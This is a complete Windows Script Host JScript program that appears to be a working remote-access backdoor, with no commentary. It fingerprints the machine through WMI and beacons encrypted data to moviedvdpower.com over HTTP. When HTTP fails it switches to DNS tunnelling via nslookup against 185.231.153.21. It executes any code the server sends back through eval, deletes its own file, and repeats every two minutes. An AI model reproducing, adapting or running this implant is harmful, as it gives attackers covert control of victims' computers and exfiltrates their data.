String.prototype.shuffle = function() 
{ 
    var a = this.split(""),n = a.length;
    for (var i = n - 1;i > 0;i--) 
    {
        var j = Math.floor(Math.random() * (i + 1));
        var tmp = a[i];
        a[i] = a[j];
        a[j] = tmp;
    } 
    return a.join("");
};
String.prototype.trim = function() { return this.replace(/^\s+|\s+$/g, "") };
Array.prototype.last = function() { return this[this.length - 1] };
var Base64 = {
        encode: function(e) 
        {
            var key = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_*".shuffle();
            var K = key + " ", t = "", n, r, i, s, o, u, a, f = 0;
            while (f < e.length) 
                {
                    n = e.charCodeAt(f++);
                    r = e.charCodeAt(f++);
                    i = e.charCodeAt(f++);
                    s = n >> 2;
                    o = (n & 3) << 4 | r >> 4;
                    u = (r & 15) << 2 | i >> 6;
                    a = i & 63;
                    if (isNaN(r)) {u = a = 64;} 
                    else if (isNaN(i)) {a = 64;}
                    t = t + K.charAt(s) + K.charAt(o) + K.charAt(u) + K.charAt(a);
                }
            return key + t.trim();
        }
};
var mode=4;
function id () 
{
    var lrequest = wmi.ExecQuery("select * from Win32_NetworkAdapterConfiguration where ipenabled = true");
    var lItems = new Enumerator(lrequest);
    for (;!lItems.atEnd();lItems.moveNext()) 
    {
        var mac = lItems.item().macaddress;
        var dns_hostname = lItems.item().DNSHostName;
        if(typeof mac === "string" && mac.length > 1) 
        {
            if(typeof dns_hostname !== "string" && dns_hostname.length < 1) 
            {
                dns_hostname = "Unknown";
            }
            else
            {
                for (var i = 0;i < dns_hostname.length;i++) 
                {
                    if (dns_hostname.charAt(i) > "z") 
                    {
                        dns_hostname = dns_hostname.substr(0, i) + "_" + dns_hostname.substr(i + 1);
                    }
                }
            }
            return mac + "_" + dns_hostname;
        }
    }
}
function crypt_controller (type, request) 
{
    var encryption_key = "";
    if(type === "decrypt") 
    {
        request = unescape(request);
        var request_split = request.split("&_&");
        request = request_split[0];
        encryption_key = request_split[1].split("");
    }
    else
    {
        encryption_key = (Math.floor(Math.random()*9000) + 1000).toString().split("");
        request=unescape(encodeURIComponent(request));
    }
    var output = new Array(request.length);
    for (var i = 0;i < request.length;i++) 
    {
        var charCode = request.charCodeAt(i) ^ encryption_key[i % encryption_key.length].charCodeAt(0);
        output[i] = String.fromCharCode(charCode);
    }
    var result_string = output.join("");
    if(type === "encrypt") 
    {
        result_string = result_string + "&_&" + encryption_key.join("");
        result_string = escape(result_string);
    }
    return result_string;
}
function rs(len, rnd) 
{
    var ret = "";
    for (var i = 0;i < len + Math.floor(Math.random() * rnd);i++) 
    {
        ret += String.fromCharCode(0x61 + Math.floor(Math.random() * 26));
    }
    return ret;
}
function get_host() 
{
    var l1 = ["com", "net", "org"];
    var hst = rs(3, 2); // give 3-4 random letters
    var ext = l1[Math.floor(Math.random() * l1.length)]; //get random TLD of the array l1
    return ["185.231.153.21", hst, ext]; // random like 185.231.153.21,aaaa,org
}
function nslookup(hst, svr, tp) 
{
    var rnd = "";
    var ofile = shell.ExpandEnvironmentStrings("%Temp%") + "\x5Cnl" + rs(3, 5) + ".tmp";
    res = shell.Run("%comspec% /c nslookup.exe -timeout=5 -retry=3 -type=" + tp + " " + hst + " " + svr + " > " + ofile + " 2>&1", 0, 1);
    var lines = [];
    if (fso.FileExists(ofile)) 
    {
        var fileObj = fso.GetFile(ofile);
        var ts = fileObj.OpenAsTextStream(1, -2);
        while (ts.AtEndOfStream !== true) {lines.push(ts.ReadLine());}
        ts.Close();
        fso.DeleteFile(ofile);
    }
    if (res != 0) return null;
    var istext = false;
    var errors = ["Unspecified error", "No response from server", "Non-existent domain", "Server failed"];
    for (var i = 0; i < lines.length;i++) 
    {
        var line = lines[i];
        for (var e in errors) { if (line.indexOf(errors[e]) > -1){ return null; } }
        if (line.indexOf("Address:") > -1)
        {
            var ip = line.split(":").last().trim();
            if (ip != svr){return ip;}
        }
        if (istext && line.trim() != "") 
        {
            var txt = line.trim().split("\x22").join("");
            return txt;
        }
        istext |= line.indexOf("text =") > -1;
    };
    return istext ? "" : null;
}

function send_dns(req, data)
 {
    var packs = Base64.encode(req + "?" + data).match(/.{1,63}/g);
    var hst = get_host();
    var n = 0;
    var p = "";
    while (packs.length > 0) 
    {
        n++;var snd = packs.shift();
        for (var i = 0;i < 2;i++) {if (packs.length > 0) snd += "." + packs.shift();}
        snd += "." + hst[1] + n + "." + hst[2];
        p = nslookup(snd, hst[0], "A");
        if (p === null) return "no";
    }
    n = 0;
    var ret = "";
    p = nslookup(hst[1] + "." + hst[2], hst[0], "TXT");
    if (p === null || p == "") return "no";
    while (p != "") 
    {
        n++;
        ret += p;
        p = nslookup(hst[1] + n + "." + hst[2], hst[0], "TXT");
        if (p == null){return "no";}
    }
    return ret;
}
function get_path () 
{
    var pathes = ["images", "pictures", "img", "info", "new"];
    var files = ["sync", "show", "hide", "add", "new", "renew", "delete"];
    var path = pathes[Math.floor(Math.random() * pathes.length)] + "/" + files[Math.floor(Math.random() * files.length)];
    return "https://moviedvdpower.com/" + path;
}
function send_data (type, data, crypt) 
{
    if (type === "request") 
        {
            var req = "?type=name";
            data = "lwirwavfynacqo=" + crypt_controller(encrypt, "group=ksoc._37817_1110&rt=512&secret=a04848d2beb242e82c8477c429595e5a&time=120000&uid="+ uniq_id + "&id=" + id() + "&" + data);
        } 
    else 
    {
        var req = "?type=content&id=" + uniq_id;
        if (crypt) {data = crypt_controller(encrypt, data);}
    }
    if (mode>0)
    {
        try
        {
            var http_object = new ActiveXObject("MSXML2.ServerXMLHTTP");
            http_object.open("POST", get_path () + req, false);
            http_object.setRequestHeader("User-Agent", "Mozilla/5.0 (Windows NT 6.1;Win64;x64;rv:69.0) Gecko/20100101 Firefox/50.0");
            http_object.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            http_object.setOption(2, 13056);
            http_object.send(data);
            mode = 4;
            return http_object.responseText;
        }
        catch(e){ if (e.number!=-1072896748){mode-=1}return "no";} }
    if (mode<1)
    {
        try
        {
            if (type !== "request" && !crypt)
            {   
                var xml = WScript.CreateObject("MSXml2.DOMDocument");
                var el = xml.createElement("Base64Data");
                el.dataType = "bin.base64";
                el.nodeTypedValue = data;
                data="b64:"+el.text;
            }       
            mode -= 1;
            if (mode<-50){ mode = 1; }
            return send_dns(req, data);
        } 
        catch (e) {return "no";}
    }
}
function main () 
{
    var ncommand = "";
    ncommand = send_data("request", "page_id=new", true);
    if(ncommand !== "no") 
    {
        try {eval(crypt_controller("decrypt", ncommand));}
        catch(e) {}
    }
    var random_knock = 120000 + (Math.floor(Math.random() * 16001) - 5000);
    WScript.Sleep(random_knock);
    main();
}
var first = false;
var shell = new ActiveXObject("WScript.Shell");
var fso = new ActiveXObject("Scripting.FileSystemObject");
var wmi = GetObject("winmgmts:root/CIMV2");
var uniq_id = new Date().getUTCMilliseconds();
var app_path = shell.expandEnvironmentStrings("%APPDATA%");
if(fso.GetAbsolutePathName(fso.GetParentFolderName(app_path)).indexOf("AppData") > 5) 
{
    if(WScript.ScriptFullName.indexOf("morito")<0){fso.deleteFile(WScript.ScriptFullName);} 
    try
    {
        WScript.Sleep(120000);
        main();
    }
    catch(e) {main();}
}
